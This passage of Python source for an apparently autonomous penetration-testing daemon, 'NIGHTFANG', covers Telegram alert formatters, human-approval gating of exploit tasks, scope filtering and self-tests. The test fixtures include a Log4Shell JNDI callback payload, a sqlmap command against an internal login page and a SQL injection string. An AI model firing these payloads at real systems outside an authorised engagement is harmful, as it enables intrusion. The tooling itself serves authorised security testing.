            lines.append("🛡️ *HITL Approvals:* Clear (0 pending)")

        msg = "\n".join(lines)
        return truncate_message(msg)

    def format_hitl_card(self, approval_request: Dict[str, Any]) -> str:
        """
        Format HITL approval card for operator with one-tap `/go` and `/hold` commands.
        """
        token = (
            approval_request.get("token")
            or approval_request.get("request_id")
            or approval_request.get("id")
            or "REQ-0000"
        )
        target = approval_request.get("target", "unknown-target")
        tool = approval_request.get("tool", "unknown-tool")
        noise = approval_request.get("noise_profile") or approval_request.get("noise") or "LOUD"
        technique = approval_request.get("technique") or approval_request.get("description") or "Exploit Validation"
        command = approval_request.get("command") or approval_request.get("benign_command") or "N/A"
        evidence_tag = approval_request.get("evidence_tag", "EVD-PENDING")

        lines = [
            "⚠️ *NIGHTFANG HITL AUTHORIZATION REQUIRED*",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"🆔 *Request Token:* `{token}`",
            f"🎯 *Target:* `{target}`",
            f"🔧 *Tool:* `{tool}` | 🔊 *Noise:* `{noise}`",
            f"💡 *Technique:* {technique}",
            f"🏷️ *Evidence Tag:* `{evidence_tag}`",
            "",
            "🔬 *Proposed Benign PoC Command:*",
            f"```\n{command}\n```",
            "",
            "⚖️ *Operator Decision:*",
            f"✅ Approve: `/go {token}`",
            f"🛑 Reject:  `/hold {token}`",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            "_(Other non-invasive scans continue executing in parallel)_",
        ]
        return truncate_message("\n".join(lines))

    def format_finding_alert(self, finding: Dict[str, Any]) -> str:
        """
        Format push notification alert for high/critical findings.
        """
        inner = finding.get("finding", finding)
        fid = inner.get("id", "NF-FINDING-000")
        title = inner.get("title", "Security Finding")
        target = inner.get("target", "unknown")
        category = inner.get("category", "vulnerability")
        cwe_id = inner.get("cwe_id", "CWE-000")

        sev_obj = inner.get("severity", {})
        if isinstance(sev_obj, dict):
            sev_level = sev_obj.get("level", "medium").upper()
            sev_score = sev_obj.get("score", 5.0)
        else:
            sev_level = str(sev_obj).upper()
            sev_score = 5.0

        conf_obj = inner.get("confidence", {})
        conf_score = conf_obj.get("score", 7) if isinstance(conf_obj, dict) else 7

        badge = "🔴" if sev_score >= 9.0 else "🟠" if sev_score >= 7.0 else "🟡" if sev_score >= 4.0 else "🔵"

        # MITRE ATT&CK & D3FEND
        mitre = inner.get("mitre_attack", {})
        tactics = mitre.get("tactics", []) if isinstance(mitre, dict) else []
        tactic_id = tactics[0].get("id", "T1190") if tactics else "T1190"

        d3fend = inner.get("mitre_d3fend", {})
        countermeasures = d3fend.get("countermeasures", []) if isinstance(d3fend, dict) else []
        d3_id = countermeasures[0].get("id", "D3-PSA") if countermeasures else "D3-WAF"

        # Evidence
        evd = inner.get("evidence", {})
        if isinstance(evd, list):
            first_evd = evd[0] if evd else {}
            digest = (first_evd.get("raw_payload_sha256") or "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")[:12]
            sample = first_evd.get("data", "") or first_evd.get("description", "") or inner.get("description", "")
        elif isinstance(evd, dict):
            digest = evd.get("raw_payload_sha256", "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")[:12]
            sample = evd.get("evidence_sample", "") or inner.get("description", "")
        else:
            digest = "e3b0c44298fc"
            sample = str(inner.get("description", ""))

        if len(sample) > 200:
            sample = sample[:197] + "..."

        lines = [
            f"{badge} *NIGHTFANG FINDING ALERT: [{sev_level}]*",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"🆔 *ID:* `{fid}` | `{cwe_id}`",
            f"📌 *Title:* {title}",
            f"🎯 *Target:* `{target}`",
            f"📊 *Severity:* `{sev_score}/10` | *Confidence:* `{conf_score}/10`",
            f"🛡️ *MITRE:* ATT&CK `{tactic_id}` ↔ D3FEND `{d3_id}`",
            f"🔑 *Evidence Hash:* `[EVD-{digest}]`",
            "",
            "📝 *Description / Evidence Preview:*",
            f"```\n{sample}\n```",
        ]
        return truncate_message("\n".join(lines))

    def format_findings_overview(
        self,
        findings: List[Dict[str, Any]],
        filter_target: Optional[str] = None,
    ) -> str:
        """
        Format /findings card with 2-tier Hierarchical Scope Structure:
        Root Scope Domain -> Subdomains/Hosts -> Findings.
        - If filter_target is a root domain, renders all subdomains under that root scope.
        - If filter_target is a specific host, renders findings for that host.
        - If filter_target is None, renders a hierarchical overview across all root scopes.
        """
        if not findings:
            target_msg = f" for `{filter_target}`" if filter_target else ""
            return f"🛡️ *NIGHTFANG Findings:*{target_msg}\nNo security findings currently recorded."

        # Build hierarchical structure: scopes[root_domain][host] = [findings]
        scopes: Dict[str, Dict[str, List[Dict[str, Any]]]] = {}
        for f in findings:
            inner = f.get("finding", f)
            raw_target = str(inner.get("target", "general")).strip()
            host = normalize_target_host(raw_target)
            root = extract_root_domain(host)

            scope_hosts = scopes.setdefault(root, {})
            scope_hosts.setdefault(host, []).append(inner)

        # Handle filtering
        if filter_target:
            clean_filter = normalize_target_host(filter_target)
            filter_root = extract_root_domain(clean_filter)

            # Check if filter matches a Root Scope Domain directly
            if clean_filter in scopes:
                target_scope_hosts = scopes[clean_filter]
                total_in_scope = sum(len(fl) for fl in target_scope_hosts.values())
                lines = [
                    f"🛡️ *NIGHTFANG Findings for Scope `{clean_filter}`* ({total_in_scope} findings across {len(target_scope_hosts)} hosts):",
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
                ]
                for h_name, h_list in sorted(target_scope_hosts.items()):
                    lines.append(f"🌐 *Subdomain:* `{h_name}` ({len(h_list)} findings)")
                    for idx, item in enumerate(h_list[:5], 1):
                        sev = item.get("severity", {})
                        score = sev.get("score", 5.0) if isinstance(sev, dict) else 5.0
                        badge = "🔴" if score >= 9.0 else "🟠" if score >= 7.0 else "🟡" if score >= 4.0 else "🔵"
                        cwe = item.get("cwe_id", "CWE-000")
                        title = item.get("title", "Finding")
                        lines.append(f"   {idx}. {badge} `[{score:.1f}]` *{title}* (`{cwe}`)")
                    if len(h_list) > 5:
                        lines.append(f"   _... and {len(h_list) - 5} more on this host._")
                    lines.append("")
                return truncate_message("\n".join(lines).strip())

            # Check if filter matches a specific subdomain/host inside a root scope
            matched_host_findings: Optional[List[Dict[str, Any]]] = None
            matched_host_name = clean_filter
            matched_root_name = filter_root

            for r_name, r_hosts in scopes.items():
                if clean_filter in r_hosts:
                    matched_host_findings = r_hosts[clean_filter]
                    matched_host_name = clean_filter
                    matched_root_name = r_name
                    break

            if not matched_host_findings:
                # Substring fallback search
                for r_name, r_hosts in scopes.items():
                    for h_name, h_list in r_hosts.items():
                        if clean_filter in h_name or h_name in clean_filter:
                            matched_host_findings = h_list
                            matched_host_name = h_name
                            matched_root_name = r_name
                            break
                    if matched_host_findings:
                        break

            if not matched_host_findings:
                active_roots = ", ".join(f"`{k}`" for k in scopes.keys())
                return (
                    f"🛡️ *NIGHTFANG Findings for `{filter_target}`:*\n"
                    f"No findings recorded for this specific target or host. Active root scopes: {active_roots}"
                )

            lines = [
                f"🛡️ *NIGHTFANG Findings for Host `{matched_host_name}`*",
                f"🏛️ *Root Scope:* `{matched_root_name}` | *Total:* `{len(matched_host_findings)}` findings",
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            ]
            for idx, item in enumerate(matched_host_findings[:10], 1):
                sev = item.get("severity", {})
                score = sev.get("score", 5.0) if isinstance(sev, dict) else 5.0
                badge = "🔴" if score >= 9.0 else "🟠" if score >= 7.0 else "🟡" if score >= 4.0 else "🔵"
                cwe = item.get("cwe_id", "CWE-000")
                title = item.get("title", "Finding")
                lines.append(f"{idx}. {badge} `[{score:.1f}]` *{title}* (`{cwe}`)")

            if len(matched_host_findings) > 10:
                lines.append(f"\n_... and {len(matched_host_findings) - 10} more findings on this host._")

            return truncate_message("\n".join(lines))

        # Overall Hierarchical Overview across all Root Scope Domains
        total_findings = sum(sum(len(fl) for fl in r_hosts.values()) for r_hosts in scopes.values())
        lines = [
            f"🛡️ *NIGHTFANG Findings Overview* ({total_findings} total across {len(scopes)} root scopes):",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        ]
        for r_name, r_hosts in sorted(scopes.items()):
            scope_total = sum(len(fl) for fl in r_hosts.values())
            all_scope_findings = [f for fl in r_hosts.values() for f in fl]
            crits = sum(1 for x in all_scope_findings if (x.get("severity", {}).get("score", 0) if isinstance(x.get("severity"), dict) else 0) >= 9.0)
            highs = sum(1 for x in all_scope_findings if 7.0 <= (x.get("severity", {}).get("score", 0) if isinstance(x.get("severity"), dict) else 0) < 9.0)
            meds = scope_total - crits - highs

            lines.append(f"🏛️ *Root Scope:* `{r_name}` ({scope_total} findings across {len(r_hosts)} hosts)")
            lines.append(f"   🔴 {crits} Critical | 🟠 {highs} High | 🟡 {meds} Other")
            for h_name, h_list in sorted(r_hosts.items())[:3]:
                lines.append(f"   • 🌐 `{h_name}`: {len(h_list)} findings")
            if len(r_hosts) > 3:
                lines.append(f"   • _... +{len(r_hosts) - 3} more subdomains_")
            lines.append(f"   👉 View scope: `/findings {r_name}`")
            lines.append("")

        return truncate_message("\n".join(lines).strip())

    def format_scope_card(self, scope_config: Dict[str, Any]) -> str:
        """
        Format /scope card displaying target CIDRs, domains, and restricted exclusions.
        """
        target = scope_config.get("target", "target.corp")
        cidrs = scope_config.get("allowed_cidrs", [])
        domains = scope_config.get("allowed_domains", [])
        exclusions = scope_config.get("out_of_scope_exclusions", [])
        rate = scope_config.get("max_requests_per_second", 20)

        lines = [
            "🎯 *NIGHTFANG ENGAGEMENT SCOPE*",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"📍 *Primary Target:* `{target}`",
            f"⚡ *Max Safe Rate:* `{rate} req/sec`",
            "",
            "✅ *Authorized In-Scope Domains:*",
        ]
        for d in (domains or [target])[:5]:
            lines.append(f"  • `{d}`")

        if cidrs:
            lines.append("")
            lines.append("🌐 *Authorized CIDR Subnets:*")
            for c in cidrs[:5]:
                lines.append(f"  • `{c}`")

        lines.append("")
        lines.append("🛑 *Prohibited Exclusions (Zero Traffic):*")
        ex_list = exclusions or ["169.254.169.254 (Cloud IMDS)", "Production Auth DBs", "Payment Gateways"]
        for e in ex_list[:4]:
            lines.append(f"  ❌ {e}")

        return truncate_message("\n".join(lines))



# ============================================================================
# Test Suites
# ============================================================================

def run_daemon_tests() -> bool:
    """Verifies all aspects of the Autonomous Hunter Daemon."""
    print("Running NIGHTFANG Autonomous Hunter Daemon Self-Tests...")

    cfg = EngagementConfig(
        engagement_id="ENG-AUTONOMOUS-TEST",
        authorized_operator="lead-tester",
        authorized_cidrs=["10.0.0.0/8"],
        authorized_domains=["*.target.corp", "target.corp"],
        autonomy_tier=AutonomyTier.SEMI_AUTONOMOUS,
    )
    daemon = AutonomousHunterDaemon(cfg)

    # Test 1: Priority Queue Ordering
    t_low = HunterTask.create("t-low", TaskPriority.LOW, "target.corp", "recon", "recon", "whois", "whois target.corp", NoiseProfile.QUIET, ActionType.PASSIVE_READ)
    t_crit = HunterTask.create("t-crit", TaskPriority.CRITICAL, "target.corp", "scanner", "scanner", "check", "check", NoiseProfile.LOUD, ActionType.EXPLOIT_POC)
    t_high = HunterTask.create("t-high", TaskPriority.HIGH, "target.corp", "recon", "recon", "dns", "dns", NoiseProfile.QUIET, ActionType.PASSIVE_READ)

    daemon.queue.push(t_low)
    daemon.queue.push(t_crit)
    daemon.queue.push(t_high)

    first = daemon.queue.pop()
    assert first is not None and first.task_id == "t-crit", "CRITICAL task must pop first"
    second = daemon.queue.pop()
    assert second is not None and second.task_id == "t-high", "HIGH task must pop second"
    third = daemon.queue.pop()
    assert third is not None and third.task_id == "t-low", "LOW task must pop third"
    print("  [PASS] Test 1: Priority queue ordering and heap invariant verified.")

    # Test 2: Semi-Autonomous Auto-Execution (GREEN/YELLOW tiers)
    t_passive = HunterTask.create("t-pass", TaskPriority.MEDIUM, "target.corp", "recon", "recon", "echo", "echo 'api.target.corp discovered'", NoiseProfile.QUIET, ActionType.PASSIVE_READ)
    daemon.queue.push(t_passive)
    res = daemon.execute_next_task()
    assert res is not None and res["status"] == "COMPLETED", "Passive task must auto-complete under SEMI_AUTONOMOUS"
    assert "api.target.corp" in daemon.discovered_assets, "Domain discovery must automatically expand attack surface"
    assert daemon.queue.pending_count() > 0, "Lead generator must automatically enqueue new scan for discovered domain"
    # Verify URL lead expansion and scope filtering
    daemon._expand_attack_surface(t_passive, "Endpoints: https://api.target.corp/login and https://evil.corp/payload and http:///bad")
    assert "https://api.target.corp/login" in daemon.discovered_assets, "In-scope URL lead must be discovered"
    assert "https://evil.corp/payload" not in daemon.discovered_assets, "Out-of-scope URL lead must be rejected"
    assert "http:///bad" not in daemon.discovered_assets, "Malformed URL without hostname must be rejected"
    print("  [PASS] Test 2: Semi-Autonomous execution and recursive lead expansion verified.")

    # Test 3: Non-Blocking Asynchronous HITL Queueing
    while daemon.queue.pop() is not None:
        pass  # Drain queue for isolated HITL test
    t_exploit = HunterTask.create(
        "t-exp",
        TaskPriority.CRITICAL,
        "target.corp",
        "scanner",
        "scanner",
        "sqlmap",
        "echo 'simulated exploit'",
        NoiseProfile.LOUD,
        ActionType.EXPLOIT_POC,
        technique="SQL Injection Verification",
    )
    # Also push a passive scan that must NOT be blocked
    t_background = HunterTask.create("t-bg", TaskPriority.LOW, "target.corp", "recon", "recon", "echo", "echo 'crawling background'", NoiseProfile.QUIET, ActionType.PASSIVE_READ)
    daemon.queue.push(t_exploit)
    daemon.queue.push(t_background)

    res_exp = daemon.execute_next_task()
    assert res_exp is not None and res_exp["status"] == "PAUSED_FOR_APPROVAL", "Exploit action must pause for HITL approval"
    assert daemon.queue.paused_count() == 1, "Paused task must be stored in paused_hitl index"

    # Crucial Non-blocking test: Verify the background scan immediately executes next!
    res_bg = daemon.execute_next_task()
    assert res_bg is not None and res_bg["status"] == "COMPLETED", "Daemon must continue processing other targets while HITL is paused"
    print("  [PASS] Test 3: Non-blocking asynchronous HITL queueing verified.")

    # Test 4: Approve / Deny Resumption
    approved = daemon.approve_hitl_task("t-exp", operator_id="lead-tester")
    assert approved is True, "Approval must succeed and mint token"
    resumed_task = daemon.execute_next_task()
    assert resumed_task is not None and resumed_task["task_id"] == "t-exp", "Approved task must resume execution"
    assert resumed_task["status"] == "COMPLETED", "Approved task must execute and complete"
    print("  [PASS] Test 4: Operator Approve/Deny token resumption verified.")

    # Test 5: Self-Healing Backoff on 429
    daemon.state.trigger_rate_backoff("target.corp", "Simulated 429")
    rate_info = daemon.state.rate_state.get("target.corp")
    assert rate_info is not None and rate_info["current_rate"] < 20, "Rate backoff must throttle request ceiling"
    print("  [PASS] Test 5: Self-healing rate backoff trigger verified.")

    # Test 6: 429 Retry Re-enqueues Task without marking failed
    # Clear backoff window so task is not held in QUEUED state
    daemon.state.rate_state["target.corp"]["backoff_until"] = 0
    while daemon.queue.pop() is not None:
        pass
    py_bin = os.path.basename(sys.executable)
    if py_bin.lower().endswith(".exe"):
        py_bin = py_bin[:-4]
    t_retry = HunterTask.create(
        "t-retry-429",
        TaskPriority.HIGH,
        "target.corp",
        "scanner",
        "scanner",
        py_bin,
        f"{sys.executable} -c \"raise SystemExit('HTTP 429 Too Many Requests')\"",
        NoiseProfile.QUIET,
        ActionType.PASSIVE_READ,
        technique="Rate Limit Retry Test",
    )
    daemon.queue.push(t_retry)
    retry_res = daemon.execute_next_task()
    assert retry_res is not None and retry_res["status"] == "RETRY_QUEUED", f"Expected RETRY_QUEUED, got {retry_res}"
    assert retry_res["retry_count"] == 1
    assert daemon.queue.pending_count() == 1, "Task must be re-enqueued in pending queue"
    re_popped = daemon.queue.pop()
    assert re_popped is not None and re_popped.task_id == "t-retry-429"
    assert re_popped.retry_count == 1
    assert re_popped.status == TaskStatus.PENDING
    print("  [PASS] Test 6: 429 retry re-enqueues task without marking failed.")

    print("\nAll 6 Daemon self-tests PASSED successfully!")
    return True



def run_hud_tests() -> bool:
    """Run automated verification suite for Autonomous Hunter Terminal HUD."""
    print("Running NIGHTFANG Autonomous Hunter Terminal HUD Self-Tests...")

    # Test 1: ASCII box generation and boundary formatting (with ANSI)
    hud_ansi = HunterHUD(force_ansi=True)
    frame = hud_ansi.render(
        engagement_id="ENG-2026-TEST",
        target_scope=["target.corp", "*.target.corp"],
        autonomy_tier="SEMI_AUTONOMOUS",
        status="ACTIVE",
        queue_counts={"CRITICAL": 1, "HIGH": 3, "MEDIUM": 5, "LOW": 10},
        active_tasks=[{"tool": "nuclei", "target": "api.target.corp", "technique": "API Scan"}],
        rate_backoffs={"api.target.corp": time.time() + 30},
        discovered_assets=["target.corp", "api.target.corp", "vpn.target.corp"],
        pending_hitl=[{"token": "tok-987a", "target": "api.target.corp", "technique": "SQLi PoC"}],
        term_width=80,
    )
    assert "NIGHTFANG AUTONOMOUS HUNTER HUD" in frame
    assert "ENG-2026-TEST" in frame
    assert "CRITICAL: 1" in frame
    assert "HIGH: 3" in frame
    print("  [PASS] Test 1: Terminal HUD ASCII border layout and box formatting verified.")

    # Test 2: Queue counts and formatting assertion
    assert "MEDIUM: 5" in frame
    assert "LOW: 10" in frame
    assert "19 tasks" in frame
    print("  [PASS] Test 2: Multi-tier DAG priority queue counts formatted accurately.")

    # Test 3: Rate backoff countdown rendering
    assert "30s remaining" in frame or "29s remaining" in frame
    print("  [PASS] Test 3: Host rate throttle backoff countdown rendering verified.")

    # Test 4: Non-TTY fallback mode (clean plain text without escape sequences)
    hud_nontty = HunterHUD(force_ansi=False)
    plain_frame = hud_nontty.render(
        engagement_id="ENG-PLAIN-TEST",
        target_scope=["plain.corp"],
        autonomy_tier="FULL_AUTONOMOUS",
        status="ACTIVE",
        queue_counts={"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 0},
        active_tasks=[],
        rate_backoffs={},
        discovered_assets=["plain.corp"],
        pending_hitl=[],
        term_width=80,
    )
    assert "\033[" not in plain_frame, f"Found unexpected ANSI escapes in non-TTY mode: {plain_frame}"
    assert "ENG-PLAIN-TEST" in plain_frame
    assert "0 pending authorizations required" in plain_frame
    print("  [PASS] Test 4: Non-TTY fallback mode verified (0 escape codes generated).")

    # Test 5: Boundary alignment and truncation for long lines
    long_line = hud_nontty.format_box_line("X" * 120, 80)
    assert len(long_line) == 80, f"Expected box line length 80, got {len(long_line)}"
    assert long_line.startswith("│ ") and long_line.endswith(" │")
    assert "..." in long_line
    print("  [PASS] Test 5: Box boundary alignment and overflow truncation verified.")

    print("\nAll 5 Terminal HUD self-tests PASSED successfully!")
    return True



def run_channel_card_tests() -> bool:
    """Run automated verification suite for ChannelCardFormatter."""
    print("Running NIGHTFANG Channel Card Formatter Self-Tests...")
    formatter = ChannelCardFormatter()

    # Test 1: Render /status card from mock state
    mock_state = {
        "engagement_id": "ENG-2026-TEST",
        "target_scope": ["target.corp", "api.target.corp"],
        "autonomy_tier": "SEMI_AUTONOMOUS",
        "status": "ACTIVE",
        "progress": 75.0,
        "queue_counts": {"CRITICAL": 1, "HIGH": 3, "MEDIUM": 5, "LOW": 10},
        "active_tasks": [{"tool": "nuclei", "target": "api.target.corp", "technique": "API Scan"}],
        "rate_backoffs": {"api.target.corp": time.time() + 25},
        "pending_hitl": [{"token": "tok-77a", "target": "api.target.corp", "technique": "SQLi PoC"}],
    }
    status_card = formatter.format_status_card(mock_state)
    assert "NIGHTFANG HUNT STATUS" in status_card
    assert "[████████░░] 75%" in status_card
    assert "/go tok-77a" in status_card
    assert len(status_card) <= TELEGRAM_MAX_LENGTH
    print("  [PASS] Test 1: Render /status card with progress bar and HITL action verified.")

    # Test 2: Render HITL approval card
    mock_hitl = {
        "token": "tok-987a",
        "target": "auth.corp.internal",
        "tool": "sqlmap",
        "noise_profile": "LOUD",
        "technique": "Blind SQL Injection PoC",
        "command": "sqlmap -u 'https://auth.corp.internal/login' --batch --banner",
        "evidence_tag": "EVD-a1b2c3d4",
    }
    hitl_card = formatter.format_hitl_card(mock_hitl)
    assert "NIGHTFANG HITL AUTHORIZATION REQUIRED" in hitl_card
    assert "/go tok-987a" in hitl_card
    assert "/hold tok-987a" in hitl_card
    assert "sqlmap -u" in hitl_card
    print("  [PASS] Test 2: Render HITL approval card with /go and /hold verified.")

    # Test 3: Render Critical finding push alert
    mock_finding = {
        "finding": {
            "id": "NF-FINDING-001",
            "title": "Remote Code Execution via Log4Shell",
            "target": "vpn.target.corp:443",
            "cwe_id": "CWE-94",
            "severity": {"score": 10.0, "level": "critical"},
            "confidence": {"score": 9, "level": "confirmed"},
            "mitre_attack": {"tactics": [{"id": "T1190"}]},
            "mitre_d3fend": {"countermeasures": [{"id": "D3-UVI"}]},
            "evidence": {
                "raw_payload_sha256": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
                "evidence_sample": "${jndi:ldap://canary.nightfang/a} executed.",
            },
        }
    }
    alert_card = formatter.format_finding_alert(mock_finding)
    assert "NIGHTFANG FINDING ALERT: [CRITICAL]" in alert_card
    assert "10.0/10" in alert_card
    assert "T1190" in alert_card
    assert "D3-UVI" in alert_card
    assert "EVD-abcdef012345" in alert_card
    print("  [PASS] Test 3: Render Critical finding push alert with CVSS meter and evidence tag verified.")

    # Test 4: Truncation guard when exceeding Telegram 4096-char limit
    huge_text = "A" * 6000
    truncated = truncate_message(huge_text, max_length=4096)
    assert len(truncated) <= 4096
    assert "[truncated for Telegram]" in truncated
    print("  [PASS] Test 4: Verify text chunking/truncation when payload exceeds Telegram limit.")

    # Test 5: Markdown escaping utility
    raw_unsafe = "select * from users where name='test_user' and (1=1); # drop table!"
    escaped = escape_markdown(raw_unsafe)
    assert r"\*" in escaped
    assert r"\(" in escaped
    assert r"\)" in escaped
    assert r"\#" in escaped
    print("  [PASS] Test 5: Verify markdown escaping of special characters in raw tool output.")

    # Test 6: 2-Tier Hierarchical Scopes & Subdomain Isolation (Operator Requirement)
    findings_dataset = [
        {
            "finding": {
                "id": "F-001",
                "title": "SQL Injection in User Search",
                "target": "https://api.targetA.com:443/search",
                "cwe_id": "CWE-89",
                "severity": {"score": 9.5, "level": "critical"},
            }
        },
        {
            "finding": {
                "id": "F-002",
                "title": "Authentication Bypass",
                "target": "https://auth.targetA.com/login",
                "cwe_id": "CWE-287",
                "severity": {"score": 8.0, "level": "high"},
            }
        },
        {
            "finding": {
                "id": "F-003",
                "title": "Cross-Site Scripting",
                "target": "https://targetB.com/profile",
                "cwe_id": "CWE-79",
                "severity": {"score": 6.5, "level": "medium"},
            }
        },
    ]

    # Check overview groups under Root Scope Domain, listing subdomains
    overview = formatter.format_findings_overview(findings_dataset)
    assert "targeta.com" in overview
    assert "targetb.com" in overview
    assert "api.targeta.com" in overview
    assert "auth.targeta.com" in overview
    assert "/findings targeta.com" in overview

    # Check filtering by Root Scope Domain shows all its subdomains
    root_a_card = formatter.format_findings_overview(findings_dataset, filter_target="targetA.com")
    assert "targeta.com" in root_a_card.lower()
    assert "api.targeta.com" in root_a_card
    assert "auth.targeta.com" in root_a_card
    assert "SQL Injection" in root_a_card
    assert "Authentication Bypass" in root_a_card
    assert "targetb.com" not in root_a_card.lower()

    # Check filtering by specific Subdomain isolates only that host
    sub_api_card = formatter.format_findings_overview(findings_dataset, filter_target="api.targetA.com")
    assert "api.targeta.com" in sub_api_card
    assert "SQL Injection" in sub_api_card
    assert "auth.targeta.com" not in sub_api_card
    assert "targetb.com" not in sub_api_card.lower()
    print("  [PASS] Test 6: 2-tier Hierarchical scope grouping and subdomain filtering verified.")

    print("\nAll 6 Channel Card Formatter self-tests PASSED successfully!")
    return True




# Alias TerminalHUD
TerminalHUD = HunterHUD


def run_self_tests() -> bool:
    """Run comprehensive test suite across Autonomous Hunter, Terminal HUD & Channel Card Formatter."""
    print("==========================================================")
    print("  NIGHTFANG Consolidated Autonomous Hunter Daemon Self-Tests")
    print("==========================================================\n")
    ok1 = run_daemon_tests()
    print()
    ok2 = run_hud_tests()
    print()
    ok3 = run_channel_card_tests()
    print()
    if ok1 and ok2 and ok3:
        print("[*] All 17 Autonomous Hunter, HUD & Channel Card self-tests PASSED successfully!")
        return True
    return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="NIGHTFANG Consolidated Autonomous Hunter Daemon & Channel Card Formatter"
    )
    parser.add_argument("--test", action="store_true", help="Run automated self-tests across daemon, HUD, and cards")
    parser.add_argument("--target", type=str, help="Target domain, IP, or scope to hunt or filter")
    parser.add_argument("--tier", type=str, default="SEMI_AUTONOMOUS", choices=["REACTIVE", "SEMI_AUTONOMOUS", "FULL_AUTONOMOUS"], help="Autonomy tier")
    parser.add_argument("--continuous", "--hunt", dest="continuous", action="store_true", help="Run continuous autonomous hunting loop")
    parser.add_argument("--max-cycles", type=int, default=50, help="Maximum execution cycles")
    parser.add_argument("--dry-run", action="store_true", help="Evaluate policy and log decisions without executing tool commands")
    parser.add_argument("--approve", dest="approve_token", type=str, help="Approve a pending HITL request token")
    parser.add_argument("--deny", dest="deny_token", type=str, help="Deny a pending HITL request token")
    parser.add_argument("--card", type=str, choices=["status", "findings", "scope"], help="Render a Telegram/remote channel card")
    parser.add_argument("--status", "--status-card", dest="status_card", action="store_true", help="Print formatted Telegram status card")
    parser.add_argument("--findings", dest="findings_card", action="store_true", help="Print formatted Telegram findings card")
    parser.add_argument("--scope", dest="scope_card", action="store_true", help="Print formatted Telegram scope card")
    parser.add_argument("--hud", action="store_true", help="Render real-time terminal HUD display")

    args, unknown = parser.parse_known_args()

    if args.test:
        success = run_self_tests()
        sys.exit(0 if success else 1)

    # HITL token approval/denial
    if args.approve_token:
        cfg = EngagementConfig(engagement_id="ENG-HITL", authorized_operator="operator", authorized_domains=[args.target or "target.corp"])
        d = AutonomousHunterDaemon(cfg)
        ok = d.approve_hitl(args.approve_token)
        print(f"[*] Operator APPROVE token '{args.approve_token}': {'SUCCESS - Task resumed' if ok else 'FAILED - Token not found'}")
        sys.exit(0 if ok else 1)

    if args.deny_token:
        cfg = EngagementConfig(engagement_id="ENG-HITL", authorized_operator="operator", authorized_domains=[args.target or "target.corp"])
        d = AutonomousHunterDaemon(cfg)
        ok = d.deny_hitl(args.deny_token)
        print(f"[*] Operator DENY token '{args.deny_token}': {'SUCCESS - Task aborted' if ok else 'FAILED - Token not found'}")
        sys.exit(0 if ok else 1)

    # Channel card formatting
    formatter = ChannelCardFormatter()

    if args.card == "findings" or args.findings_card:
        try:
            from tools.findings import FindingSyncManager
        except ImportError:
            try:
                from tools.finding_sync import FindingSyncManager
            except ImportError:
                FindingSyncManager = None
        if FindingSyncManager:
            mgr = FindingSyncManager()
            findings = mgr.get_all_findings()
        else:
            findings = []
        card = formatter.format_findings_overview(findings, filter_target=args.target)
        print(card)
        sys.exit(0)

    if args.card == "scope" or args.scope_card:
        scope_cfg = {
            "target": args.target or "target.corp",
            "allowed_domains": [args.target] if args.target else ["target.corp", "api.target.corp"],
            "allowed_cidrs": ["10.0.0.0/8"],
            "out_of_scope_exclusions": ["169.254.169.254 (IMDS)"],
            "max_requests_per_second": 20,
        }
        card = formatter.format_scope_card(scope_cfg)
        print(card)
        sys.exit(0)

    if args.card == "status" or args.status_card:
        state = get_aggregated_state(target_scope=[args.target] if args.target else None)
        card = formatter.format_status_card(state)
        print(card)
        sys.exit(0)

    if args.hud:
        hud = HunterHUD()
        state = get_aggregated_state(target_scope=[args.target] if args.target else None)
        print(hud.render(state))
        sys.exit(0)

    # Continuous hunter loop
    if args.target:
        autonomy = AutonomyTier(args.tier)
        cfg = EngagementConfig(
            engagement_id=f"ENG-{int(time.time())}",
            authorized_operator="operator",
            authorized_domains=[args.target, f"*.{args.target}"],
            autonomy_tier=autonomy,
        )
        daemon = AutonomousHunterDaemon(cfg)
        daemon.seed_target(args.target)
        daemon.run_continuous(max_cycles=args.max_cycles, dry_run=args.dry_run)
        sys.exit(0)

    # Default action if no flags provided
    success = run_self_tests()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
